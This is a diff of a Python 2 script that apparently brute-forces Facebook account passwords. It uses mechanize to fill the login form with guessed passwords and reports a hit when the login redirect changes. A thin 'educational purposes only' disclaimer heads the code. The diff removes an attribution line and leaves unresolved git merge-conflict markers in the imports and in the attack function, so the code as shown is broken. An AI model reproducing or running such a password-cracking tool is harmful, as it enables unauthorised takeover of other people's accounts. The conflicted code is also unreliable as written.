@@ -3,13 +3,17 @@
 #This program is for educational purposes only.
 #Don't attack people facebook accounts it's illegal !
 #If you want to crack into someone's account, you must have the permission of the user.
-#Mauritania Attacker is not responsible.
+
 
 
 import sys
 import random
 import mechanize
 import cookielib
+<<<<<<< HEAD
+=======
+
+>>>>>>> origin/master
 
 GHT = '''
         +=======================================+
@@ -58,7 +62,11 @@ def attack(password):
      br.form['pass'] = password
      rep = br.submit()
      log = br.geturl()
+<<<<<<< HEAD
      toCheck = login in log
+=======
+     toCheck = login  in log
+>>>>>>> origin/master
      if (not toCheck):
         print "\n\n\n [*] Password found .. !!"
         print "\n [*] Password : %s\n" % (password)
